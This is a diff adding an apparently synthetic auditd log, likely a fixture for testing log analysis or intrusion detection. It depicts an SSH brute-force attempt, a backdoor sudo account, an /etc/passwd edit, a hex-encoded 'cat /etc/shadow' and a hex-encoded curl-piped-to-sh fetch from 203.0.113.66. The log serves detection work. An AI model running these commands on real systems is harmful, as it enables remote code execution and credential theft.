@@ -1,0 +1,43 @@
+type=DAEMON_START msg=audit(1792051200.000:1001): op=start ver=3.1.2 format=enriched kernel=6.8.0 auid=4294967295 pid=600 uid=0 ses=4294967295 res=success
+type=CONFIG_CHANGE msg=audit(1792051202.000:1002): auid=4294967295 ses=4294967295 op=add_rule key="passwd_changes" list=4 res=1
+type=USER_LOGIN msg=audit(1792051260.000:1003): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051263.000:1004): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="admin" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051266.000:1005): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051269.000:1006): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="oracle" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051272.000:1007): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="root" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051275.000:1008): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="test" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1792051278.000:1009): pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct="ubuntu" exe="/usr/sbin/sshd" hostname=? addr=203.0.113.66 terminal=sshd res=failed'
+type=USER_AUTH msg=audit(1792051290.000:1010): pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'
+type=USER_ACCT msg=audit(1792051291.000:1011): pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'
+type=CRED_ACQ msg=audit(1792051292.000:1012): pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred grantors=pam_unix acct="alice" exe="/usr/sbin/sshd" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'
+type=LOGIN msg=audit(1792051293.000:1013): pid=3101 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=12 res=1
+type=USER_LOGIN msg=audit(1792051294.000:1014): pid=3101 uid=0 auid=1000 ses=12 msg='op=login id=1000 exe="/usr/sbin/sshd" hostname=198.51.100.40 addr=198.51.100.40 terminal=/dev/pts/0 res=success'
+type=USER_CMD msg=audit(1792051320.000:1015): pid=3150 uid=1000 auid=1000 ses=12 msg='cwd="/home/alice" cmd=61707420757064617465 exe="/usr/bin/sudo" terminal=pts/0 res=success'
+type=USER_CMD msg=audit(1792051325.000:1016): pid=3160 uid=1001 auid=1001 ses=13 msg='cwd="/home/bob" cmd=636174202F6574632F736861646F77 exe="/usr/bin/sudo" terminal=pts/1 res=failed'
+type=USER_AUTH msg=audit(1792051326.000:1017): pid=3160 uid=1001 auid=1001 ses=13 msg='op=PAM:authentication grantors=? acct="bob" exe="/usr/bin/sudo" hostname=? addr=? terminal=/dev/pts/1 res=failed'
+type=ADD_GROUP msg=audit(1792051380.000:1018): pid=4120 uid=0 auid=1000 ses=12 msg='op=add-group id=1005 exe="/usr/sbin/useradd" hostname=web01 addr=? terminal=pts/3 res=success'
+type=ADD_USER msg=audit(1792051381.000:1019): pid=4120 uid=0 auid=1000 ses=12 msg='op=add-user id=1005 exe="/usr/sbin/useradd" hostname=web01 addr=? terminal=pts/3 res=success'
+type=USER_MGMT msg=audit(1792051382.000:1020): pid=4125 uid=0 auid=1000 ses=12 msg='op=add-user-to-group grp="sudo" acct="support" exe="/usr/sbin/usermod" hostname=web01 addr=? terminal=pts/3 res=success'
+type=USER_CHAUTHTOK msg=audit(1792051383.000:1021): pid=4130 uid=0 auid=1000 ses=12 msg='op=PAM:chauthtok grantors=pam_unix acct="support" exe="/usr/bin/passwd" hostname=web01 addr=? terminal=pts/3 res=success'
+type=SYSCALL msg=audit(1792051440.000:1022): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd0b2e a2=241 a3=1b6 items=2 ppid=4000 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=12 comm="vim" exe="/usr/bin/vim.basic" key="passwd_changes"
+type=CWD msg=audit(1792051440.000:1022): cwd="/root"
+type=PATH msg=audit(1792051440.000:1022): item=0 name="/etc/" inode=393217 dev=08:01 mode=040755 ouid=0 ogid=0 nametype=PARENT
+type=PATH msg=audit(1792051440.000:1022): item=1 name="/etc/passwd" inode=393300 dev=08:01 mode=0100644 ouid=0 ogid=0 nametype=NORMAL
+type=PROCTITLE msg=audit(1792051440.000:1022): proctitle=76696D002F6574632F706173737764
+type=SYSCALL msg=audit(1792051500.000:1023): arch=c000003e syscall=59 success=yes exit=0 a0=55d1 a1=55d2 a2=55d3 a3=0 items=2 ppid=4100 pid=4300 auid=0 uid=0 gid=0 euid=0 tty=pts4 ses=14 comm="bash" exe="/usr/bin/bash" key="exec_tmp"
+type=EXECVE msg=audit(1792051500.000:1023): argc=3 a0="bash" a1="-c" a2=6375726C202D7320687474703A2F2F3230332E302E3131332E36362F782E7368207C207368
+type=CWD msg=audit(1792051500.000:1023): cwd="/tmp"
+type=PATH msg=audit(1792051500.000:1023): item=0 name="/usr/bin/bash" inode=1310 dev=08:01 mode=0100755 nametype=NORMAL
+type=PROCTITLE msg=audit(1792051500.000:1023): proctitle=62617368002D63006375726C202D7320687474703A2F2F3230332E302E3131332E36362F782E7368207C207368
+type=ANOM_PROMISCUOUS msg=audit(1792051530.000:1024): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=14
+type=AVC msg=audit(1792051560.000:1025): avc:  denied  { read } for  pid=2210 comm="httpd" name="shadow" dev="sda1" ino=393301 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0
+type=SERVICE_STOP msg=audit(1792051600.000:1026): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=nginx comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=failed'
+type=ANOM_ABEND msg=audit(1792051620.000:1027): auid=4294967295 uid=33 gid=33 ses=4294967295 pid=3011 comm="php-fpm8.2" exe="/usr/sbin/php-fpm8.2" sig=11 res=1
+type=USER_START msg=audit(1792051800.000:1028): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=CRED_DISP msg=audit(1792051801.000:1029): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:setcred grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=USER_START msg=audit(1792052700.000:1030): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=CRED_DISP msg=audit(1792052701.000:1031): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:setcred grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=USER_START msg=audit(1792053600.000:1032): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=CRED_DISP msg=audit(1792053601.000:1033): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:setcred grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=USER_START msg=audit(1792054500.000:1034): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
+type=CRED_DISP msg=audit(1792054501.000:1035): pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:setcred grantors=pam_unix acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'
